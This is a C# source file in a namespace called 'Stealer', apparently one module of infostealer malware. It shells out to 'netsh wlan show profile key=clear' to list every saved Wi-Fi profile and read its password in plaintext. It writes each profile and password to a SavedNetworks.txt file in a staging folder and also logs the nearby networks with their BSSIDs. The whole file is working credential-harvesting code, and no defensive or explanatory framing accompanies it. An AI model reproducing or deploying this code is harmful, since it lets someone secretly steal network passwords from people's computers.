using System;
using System.IO;
using System.Linq;
using RFStub;

namespace Stealer;

internal sealed class Wifi
{
	private static string[] GetProfiles()
	{
		string text = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All");
		string[] array = text.Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = array[i].Substring(array[i].LastIndexOf(':') + 1).Trim();
		}
		return array;
	}

	private static string GetPassword(string profile)
	{
		string text = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=\"" + profile + "\" key=clear | findstr Key");
		return text.Split(new char[1] { ':' }).Last().Trim();
	}

	public static void ScanningNetworks(string sSavePath)
	{
		string contents = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid");
		File.AppendAllText(sSavePath + "\\ScanningNetworks.txt", contents);
	}

	public static void SavedNetworks(string sSavePath)
	{
		string[] profiles = GetProfiles();
		string[] array = profiles;
		foreach (string text in array)
		{
			if (!text.Equals("65001"))
			{
				Counter.SavedWifiNetworks++;
				string password = GetPassword(text);
				string contents = "PROFILE: " + text + "\nPASSWORD: " + password + "\n\n";
				File.AppendAllText(sSavePath + "\\SavedNetworks.txt", contents);
			}
		}
	}
}
